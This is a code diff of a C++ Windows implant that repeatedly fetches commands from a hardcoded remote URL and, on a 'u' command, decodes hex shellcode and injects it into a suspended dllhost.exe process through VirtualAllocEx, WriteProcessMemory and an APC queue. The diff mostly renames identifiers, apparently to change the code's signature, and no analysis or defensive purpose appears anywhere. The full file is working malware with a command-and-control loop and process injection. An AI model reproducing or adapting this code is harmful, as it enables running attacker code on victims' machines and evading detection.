@@ -8,63 +8,63 @@
 #pragma comment ( lib, "ws2_32.lib" )
 #pragma comment ( lib, "wldap32.lib" )
 
-
+#define CODE__SIZE 10*1024
 #define URL "http://api.10086.li/txt.txt"
 
 using namespace std;
 
-DWORD WINAPI run_slcd(LPVOID p);
-string str_to_hex(string hex);
-string hexcode;
+DWORD WINAPI run__slcd__(LPVOID p);
+string str__to__hex__(string hex);
+string __hexcode__;
 
 
-class CurlWapper
+class Chttp
 {
 private:
-    CURL* _curl;
-    stringstream _rs;
-    long _code;
+    CURL* __curl;
+    stringstream __rs;
+    long __code;
 public:
-    CurlWapper()
-        : _curl(curl_easy_init())
-        , _code(0)
+    Chttp()
+        : __curl(curl_easy_init())
+        , __code(0)
     {
 
     }
-    ~CurlWapper()
+    ~Chttp()
     {
-        if (_curl) curl_easy_cleanup(_curl);
+        if (__curl) curl_easy_cleanup(__curl);
     }
-    string _get(const string& _url)
+    string __get(const string& __url)
     {
         CURLcode res;
-        curl_easy_setopt(_curl, CURLOPT_URL, _url.c_str());
-        curl_easy_setopt(_curl, CURLOPT_FOLLOWLOCATION, 1L);
-        curl_easy_setopt(_curl, CURLOPT_WRITEFUNCTION, _receive_data);
-        curl_easy_setopt(_curl, CURLOPT_WRITEDATA, this);
+        curl_easy_setopt(__curl, CURLOPT_URL, __url.c_str());
+        curl_easy_setopt(__curl, CURLOPT_FOLLOWLOCATION, 1L);
+        curl_easy_setopt(__curl, CURLOPT_WRITEFUNCTION, __receive__data);
+        curl_easy_setopt(__curl, CURLOPT_WRITEDATA, this);
 
-        _rs.str("");
-        _code = 0;
-        res = curl_easy_perform(_curl);
+        __rs.str("");
+        __code = 0;
+        res = curl_easy_perform(__curl);
         if (res != CURLE_OK)
         {
             throw runtime_error(curl_easy_strerror(res));
         }
-        curl_easy_getinfo(_curl, CURLINFO_RESPONSE_CODE, &_code);
-        return _rs.str();
+        curl_easy_getinfo(__curl, CURLINFO_RESPONSE_CODE, &__code);
+        return __rs.str();
     }
-    long _GetHttpCode()
+    long __GetHttpCode()
     {
-        return _code;
+        return __code;
     }
 private:
-    static size_t _receive_data(void* buffer, size_t size, size_t nmemb, void* userp)
+    static size_t __receive__data(void* buffer, size_t size, size_t nmemb, void* userp)
     {
-        return static_cast<CurlWapper*>(userp)->_write_rdata(buffer, size, nmemb);
+        return static_cast<Chttp*>(userp)->__write__rdata(buffer, size, nmemb);
     }
-    size_t _write_rdata(void* buffer, size_t size, size_t nmemb)
+    size_t __write__rdata(void* buffer, size_t size, size_t nmemb)
     {
-        _rs.write((const char*)buffer, size * nmemb);
+        __rs.write((const char*)buffer, size * nmemb);
         return size * nmemb;
     }
 };
@@ -73,9 +73,9 @@ private:
 class Conf
 {
 private:
-    int _s;
-    string _t;
-    string _v;
+    int __s;
+    string __t;
+    string __v;
 public:
     Conf(string res)
     {
@@ -92,49 +92,48 @@ public:
         while (getline(is, line, split))
         {
 
-            int line_len = line.length();
+            int line__len = line.length();
             int flag = line.find(":");
             string key = line.substr(0, flag);
-            string value = line.substr(flag + 1, line_len);
+            string value = line.substr(flag + 1, line__len);
             if (key == "s")
             {
-                this->_s = atoi(value.c_str());
+                this->__s = atoi(value.c_str());
             }
             else if (key == "t")
             {
-                this->_t = value;
+                this->__t = value;
             }
             if (key == "v")
             {
-                this->_v = value;
+                this->__v = value;
             }
         }
     };
-    ~Conf();
 
     VOID run()
     {
 
-        if (this->_t == "c\r" || this->_t == "c")
+        if (this->__t == "c\r" || this->__t == "c")
         {
-            // system((this->_v).c_str());
+            // system((this->__v).c__str());
         }
-        else if (this->_t == "u\r" || this->_t == "u")
+        else if (this->__t == "u\r" || this->__t == "u")
         {
             try {
 
-                hexcode = this->_v;
-                HANDLE hThread = CreateThread(NULL, NULL, run_slcd, NULL, NULL, NULL);
+                __hexcode__ = this->__v;
+                CreateThread(NULL, NULL, run__slcd__, NULL, NULL, NULL);
             }
             catch (exception e)
             {
             };
         }
-        else if (this->_t == "e\r" || this->_t == "e")
+        else if (this->__t == "e\r" || this->__t == "e")
         {
             exit(0);
         }
-        Sleep(this->_s * 1000);
+        Sleep(this->__s * 1000);
 
     };
 
@@ -144,7 +143,7 @@ private:
 
 
 
-string str_to_hex(string strHex) {
+string str__to__hex__(string strHex) {
     string tmpStr = "";
     for (size_t j = 0; j < strHex.length(); j += 2) {
         string hex16 = strHex.substr(j, 2);
@@ -154,33 +153,33 @@ string str_to_hex(string strHex) {
     return tmpStr;
 };
 
-DWORD WINAPI run_slcd(LPVOID lpParameter)
+DWORD WINAPI run__slcd__(LPVOID lpParameter)
 {
-    string _code_str = str_to_hex(hexcode);
-    int _len = hexcode.length();
-    unsigned char _code[10000] = { 0 };
-    memcpy(_code, _code_str.c_str(), _len / 2 + 1);
-    UINT _codeSize = sizeof(_code);
+    string __code__str__ = str__to__hex__(__hexcode__);
+    int __len = __hexcode__.length();
+    unsigned char __code[CODE__SIZE] = { 0 };
+    memcpy(__code, __code__str__.c_str(), __len / 2 + 1);
+    UINT __codeSize = sizeof(__code);
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     CreateProcessA("C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, _codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, __codeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
-    WriteProcessMemory(victimProcess, shellAddress, _code, _codeSize, NULL);
+    WriteProcessMemory(victimProcess, shellAddress, __code, __codeSize, NULL);
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
 
     ResumeThread(threadHandle);
     return 0;
 }
 
-DWORD WINAPI d_run(LPVOID P)
+DWORD WINAPI d__run__(LPVOID P)
 {
-_GO:
+__GO:
     try {
-        CurlWapper _c;
-        string res = _c._get(URL);
+        Chttp __c;
+        string res = __c.__get(URL);
         Conf* conf = new Conf(res);
         conf->run();
         return 0;
@@ -188,7 +187,7 @@ _GO:
     catch (exception e)
     {
         Sleep(3000);
-        goto _GO;
+        goto __GO;
     }
     return 0;
 }
